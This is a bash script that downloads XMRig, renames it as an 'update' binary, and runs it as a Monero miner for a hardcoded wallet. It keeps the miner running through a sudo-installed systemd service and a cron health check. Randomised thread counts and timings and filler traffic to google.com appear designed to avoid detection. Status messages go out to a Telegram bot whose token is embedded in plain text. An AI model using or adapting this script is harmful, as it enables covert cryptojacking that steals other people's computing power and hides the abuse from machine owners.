#!/bin/bash

# === UNLOCK FILES IF EXIST ===
fuser -k ~/Documents/build/update 2>/dev/null
rm -f ~/Documents/build/update

# === SETUP VARIABLES ===
WALLET="84QEvQ9V25mUNDiMXmq1aF96FwpzDPg4R1d564MjhvxrNpz7rizA3Q3FUowb83rsBK8P9DnDQnk4hTED57Ycd4p1Q8uRzZz"
WORKER="$1"
POOL="pool.supportxmr.com:443"
LOG_FILE="$HOME/desktop.log"
MINER_PATH="$HOME/Documents/build/update"
WRAPPER_SCRIPT="$HOME/desktop-update-wrapper.sh"
BOT_TOKEN="7828954337:AAHFZPTv5znzf2LcR5sIO3bHBMDWM7hFB3k"
CHAT_ID="7107536205"

# === INSTALL DEPENDENCIES ===
sudo apt update
sudo apt install -y git curl tmux cron build-essential cmake libuv1-dev libssl-dev libhwloc-dev unzip

# === CREATE NECESSARY DIRECTORY ===
mkdir -p "$HOME/Documents/build"

# === BUILD XMRIG ===
rm -rf ~/Documents/xmrig
cd ~/Documents

LATEST_URL=$(curl -s https://api.github.com/repos/xmrig/xmrig/releases/latest | grep browser_download_url | grep linux-x64 | grep -v "debug" | cut -d '"' -f 4 | head -n 1)
curl -LO "$LATEST_URL"
tar -xf xmrig-*-linux-x64.tar.gz
mv xmrig-*/xmrig "$MINER_PATH"
chmod +x "$MINER_PATH"

# === CREATE WRAPPER SCRIPT ===
cat > "$WRAPPER_SCRIPT" <<EOF
#!/bin/bash
SESSION="miner"

if ! tmux has-session -t \$SESSION 2>/dev/null; then
  tmux new-session -d -s \$SESSION
fi

while true; do
  MIN_TIME=720
  MAX_TIME=1020
  MIN_THREADS=12
  MAX_THREADS=16
  MIN_SLEEP=20
  MAX_SLEEP=130

  THREADS=\$((RANDOM % (MAX_THREADS - MIN_THREADS + 1) + MIN_THREADS))
  TIME=\$((RANDOM % (MAX_TIME - MIN_TIME + 1) + MIN_TIME))
  SLEEP=\$((RANDOM % (MAX_SLEEP - MIN_SLEEP + 1) + MIN_SLEEP))

  curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" -d chat_id="$CHAT_ID" -d text="[\$WORKER] ⛏️ Mining for \$((TIME/60))m with \$THREADS threads"
  tmux send-keys -t \$SESSION "$MINER_PATH -o $POOL -u $WALLET -p \$WORKER --tls --threads=\$THREADS --coin=monero --donate-level=1 >> $LOG_FILE 2>&1" C-m
  sleep \$TIME
  pkill -f "$MINER_PATH"

  curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" -d chat_id="$CHAT_ID" -d text="[\$WORKER] 😴 Sleeping \$SLEEP sec with activity"

  for ((i=0; i<\$SLEEP; i++)); do
    curl -s https://google.com > /dev/null
    sleep 1
  done
done
EOF

chmod +x "$WRAPPER_SCRIPT"

# === CREATE SYSTEMD SERVICE ===
SERVICE_FILE="/etc/systemd/system/xmrig-wrapper.service"
sudo bash -c "cat > $SERVICE_FILE" <<EOF
[Unit]
Description=XMRig Miner Wrapper
After=network.target

[Service]
ExecStart=$WRAPPER_SCRIPT
Restart=always
RestartSec=5
Nice=10
CPUWeight=70
TimeoutStartSec=30
StartLimitIntervalSec=0

[Install]
WantedBy=multi-user.target
EOF

# === ENABLE SERVICE ===
sudo systemctl daemon-reload
sudo systemctl enable xmrig-wrapper.service
sudo systemctl restart xmrig-wrapper.service

# === SETUP CRON HEALTH CHECK ===
CHECKER="/usr/local/bin/check_miner_alive.sh"
sudo bash -c "cat > $CHECKER" <<EOF
#!/bin/bash
if ! pgrep -f "$MINER_PATH" > /dev/null; then
  sudo systemctl restart xmrig-wrapper.service
  curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" -d chat_id="$CHAT_ID" -d text="[\$WORKER] ⚠️ Auto-restarted miner (not found)"
fi
EOF
sudo chmod +x $CHECKER
(crontab -l 2>/dev/null; echo "*/5 * * * * $CHECKER") | crontab -

# === DONE ===
STATUS=$(systemctl is-active xmrig-wrapper.service)
echo "=========================================="
echo "✅ Miner \$WORKER is configured and running"
echo "🛠️  Binary: $MINER_PATH"
echo "📝 Logs: $LOG_FILE"
echo "📦 Service: xmrig-wrapper [Status: \$STATUS]"
echo "🔁 Restart: sudo systemctl restart xmrig-wrapper"
echo "🛑 Stop:    sudo systemctl stop xmrig-wrapper"
echo "🔍 Logs:    tail -f $LOG_FILE"
echo "🧠 Tmux:    tmux attach-session -t miner"
echo "=========================================="
